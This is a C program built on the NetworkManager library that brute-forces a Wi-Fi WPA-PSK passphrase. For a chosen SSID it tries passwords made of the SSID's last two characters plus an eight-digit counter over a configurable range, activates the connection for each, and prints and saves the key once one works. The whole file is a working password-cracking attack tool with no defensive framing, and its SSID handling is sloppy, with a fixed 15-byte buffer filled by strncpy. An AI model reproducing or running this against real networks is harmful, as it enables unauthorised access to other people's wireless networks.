#include <glib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <stdbool.h>
#include <glib-object.h>
#include <glibconfig.h>
#include <nm-dbus-interface.h>
#include <sched.h>
#include <NetworkManager.h>
#include <pthread.h>
#include "../TUI/tui.h"

typedef enum{
    STATUS_SUCCESS = 0,
    STATUS_FAILED,
    STATUS_IDLE
} Status;

typedef struct{
    Status status;
    bool *found;
    char *ssid;
    int to, from;
} ThreadData;

typedef struct {
    GMainLoop *loop;
    Status status;
    NMRemoteConnection *connection;
    char *passphrase;
} CallbackData;


static void print_help(){
    fprintf(stdout,
	    "\n\n"
	    "-F [filename]"
	    "-s [SSID]"
	    "-p [pattern]"
	    "-f [from] (start of range, inclusive)"
	    "-t [to] (end of range, exclusive)"
	    );
}


/**
 * Callback that runs when the connection is being added to RAM
 */
static void add_connection_callback(GObject *client, GAsyncResult *result, gpointer user_data){
    GError *error = NULL;
    CallbackData *data = (CallbackData*) user_data;

    data->connection = nm_client_add_connection_finish(NM_CLIENT(client), result, &error);

    if(error)
	data->status = STATUS_FAILED;
    else
	data->status = STATUS_SUCCESS;
    g_main_loop_quit(data->loop);
}


/**
 * Called when the password is changed in the remote connection
 */ 
static void passphrase_change_callback(GObject *client, GAsyncResult *result, gpointer user_data){
    CallbackData *data = (CallbackData*) user_data;
    g_main_loop_quit(data->loop);
}


/**
 *  Triggered when the connection is being saved into disk
 */
static void save_connection_callback(GObject *client, GAsyncResult *result, gpointer user_data){
    CallbackData *data = (CallbackData*) user_data;
    GError *error = NULL;
    if(nm_remote_connection_commit_changes_finish(data->connection, result, &error))
	data->status = STATUS_SUCCESS;
    else
	data->status = STATUS_FAILED;
    g_main_loop_quit(data->loop);
}


/**
 * Triggered once the connection is accepted and the handshakes start
 */
static void connection_handshake_callback(NMActiveConnection *connection, guint state, guint reason, gpointer user_data){
    CallbackData *data = (CallbackData*) user_data;

    if(state == NM_ACTIVE_CONNECTION_STATE_ACTIVATED){
	data->status = STATUS_SUCCESS;
	g_main_loop_quit(data->loop);
    }
    else if(state == NM_ACTIVE_CONNECTION_STATE_DEACTIVATED){
	data->status = STATUS_FAILED;
	g_main_loop_quit(data->loop);
    }
    // other case, do nothing
}


/**
 * Triggered when the connection is being activated
 */
static void activate_connection_callback(GObject *client, GAsyncResult *result, gpointer user_data) {
    CallbackData *data = (CallbackData*) user_data;
    GMainLoop *loop = data->loop;
    GError *error = NULL;
    NMActiveConnection *connection = nm_client_activate_connection_finish(NM_CLIENT(client), result, &error);
    
    if (error) {
	data->status = STATUS_FAILED;
	g_error_free(error);
	g_main_loop_quit(data->loop);
    }
    else {
	//tui_print_info("Request accepted. Waiting for WiFi handshake...");
	g_signal_connect(connection, "state-changed", G_CALLBACK(connection_handshake_callback), data);
    }
}


/**
 *  Set general settings of the connection
 */
static void set_connection_settings(NMConnection *connection, const char *ssid){
    NMSettingConnection *s_con = (NMSettingConnection *)nm_setting_connection_new();
    char *uuid = nm_utils_uuid_generate();
    g_object_set(s_con,
                 NM_SETTING_CONNECTION_ID, ssid,
                 NM_SETTING_CONNECTION_UUID, uuid,
                 NM_SETTING_CONNECTION_TYPE, NM_SETTING_WIRELESS_SETTING_NAME,
                 NM_SETTING_CONNECTION_AUTOCONNECT, TRUE,
                 NULL);
    g_free(uuid);
    nm_connection_add_setting(connection, NM_SETTING(s_con));
    
    NMSettingWireless *s_wifi = (NMSettingWireless *)nm_setting_wireless_new();
    GBytes *ssid_bytes = g_bytes_new(ssid, strlen(ssid));
    g_object_set(s_wifi,
                 NM_SETTING_WIRELESS_SSID, ssid_bytes,
                 NULL);
    g_bytes_unref(ssid_bytes);
    nm_connection_add_setting(connection, NM_SETTING(s_wifi));

    NMSettingWirelessSecurity *s_sec = (NMSettingWirelessSecurity *)nm_setting_wireless_security_new();
    g_object_set(s_sec,
                 NM_SETTING_WIRELESS_SECURITY_KEY_MGMT, "wpa-psk",
                 NM_SETTING_WIRELESS_SECURITY_PSK, "dummy_password",
                 NULL);
    nm_connection_add_setting(connection, NM_SETTING(s_sec));

    NMSettingIPConfig *s_ip4 = (NMSettingIPConfig *)nm_setting_ip4_config_new();
    g_object_set(s_ip4, NM_SETTING_IP_CONFIG_METHOD, NM_SETTING_IP4_CONFIG_METHOD_AUTO, NULL);
    nm_connection_add_setting(connection, NM_SETTING(s_ip4));
    
    NMSettingIPConfig *s_ip6 = (NMSettingIPConfig *)nm_setting_ip6_config_new();
    g_object_set(s_ip6, NM_SETTING_IP_CONFIG_METHOD, NM_SETTING_IP6_CONFIG_METHOD_AUTO, NULL);
    nm_connection_add_setting(connection, NM_SETTING(s_ip6));    
}


int main(int argc, char* argv[]){
    if(argc == 1){
	tui_print_error("Arguments are required");
	print_help();
	return 1;
    }

    int opt;
    char ssid[15];
    int from = 0, to = 100000000;
    int threads_number = 4;

    // -s <ssid>
    // -f <start of range (inclusive)> (0 default)
    // -t <end of range (exclusive)> (100000000)
    while( (opt = getopt(argc, argv, "s:f:t:")) != -1){
	switch(opt){
	case 's':
	    strncpy(ssid, optarg, 15);
	    break;
	case 'f':
	    // Not making any error checking yet
	    from = atoi(optarg);
	    break;
	case 't':
	    // Not making any error checking yet
	    to = atoi(optarg);
	    break;;
	case '?':
	    tui_print_error("Invalid argument");
	    print_help();
	    return 1;
	}
    }

    clock_t start = clock();
    GMainLoop *loop = g_main_loop_new(NULL, FALSE);
    GError *error = NULL;
    NMClient *client = nm_client_new(NULL, &error);

    if(!client){
	tui_print_error("Failed to connect to NetworkManager");
	return 1;
    }
    else
	tui_print_success("Connected to NetworkManager"); 

    // This connection pointer is used only to set the wifi settings
    // Once is passed to nm_client_add_connection_async, it is useless
    NMConnection *connection = nm_simple_connection_new();
    set_connection_settings(connection, ssid);

    CallbackData cb_data = { loop, STATUS_IDLE, NULL, NULL };
    nm_client_add_connection_async(
	client,
	connection,
	FALSE,
	NULL,
	add_connection_callback,
	&cb_data
	);

    g_main_loop_run(loop);

    if(cb_data.status == STATUS_SUCCESS)
	tui_print_success("Network profile created");
    else{
	tui_print_error("There was an error trying to create the network profile");
	return 1;
    }

    tui_print_info("Starting passphrase testing phase...");
    bool found = false;
    char passphrase[11];
    char prefix[3];
    strcpy(prefix, ssid + strlen(ssid) - 2);
    cb_data.passphrase = passphrase;

    for(int i = from; i < to; ++i ){

	snprintf(passphrase, sizeof(passphrase), "%s%08d", prefix, i);

	NMSettingWirelessSecurity *s_sec = nm_connection_get_setting_wireless_security(NM_CONNECTION(cb_data.connection));
	g_object_set(s_sec, NM_SETTING_WIRELESS_SECURITY_PSK, passphrase, NULL);

	// Set the new passphrase
	nm_remote_connection_commit_changes_async(
		cb_data.connection,
		FALSE,
		NULL,
		passphrase_change_callback,
		&cb_data);
	
	g_main_loop_run(loop);

	// Once the passphrase is changed, try to activate it
	nm_client_activate_connection_async(
		client,
		NM_CONNECTION(cb_data.connection),
		NULL, NULL, NULL,
		activate_connection_callback,
		(void*) &cb_data);
	
	g_main_loop_run(loop);

	// The passphrase was found
	if(cb_data.status == STATUS_SUCCESS){
	    found = true;
	    tui_print_success("The password is %s", passphrase);

	    // The goal now is to save the connection
	    nm_remote_connection_commit_changes_async(
		cb_data.connection,
		TRUE,
		NULL,
		save_connection_callback,
		&cb_data);
	    
	    g_main_loop_run(loop);
	    
	    if(cb_data.status == STATUS_SUCCESS)
		tui_print_success("Connection saved");
	    else
		tui_print_error("There was an error trying to save the connection");

	    // Either way the connection was saved or not, exit the main loop
	    break;
	}
	else
	    tui_print_error("%s failed", passphrase);
    }
	
    g_main_loop_unref(loop);
    g_object_unref(connection);
    g_object_unref(client);

    clock_t end = clock();
    double program_time = (double) ( (end - start) ) / CLOCKS_PER_SEC;
    if(found)
	tui_print_success("Program finished in %.2f seconds", program_time);	
    else
	tui_print_error("PSK couldn't be found (%.2f seconds)", program_time);

    return 0;
}
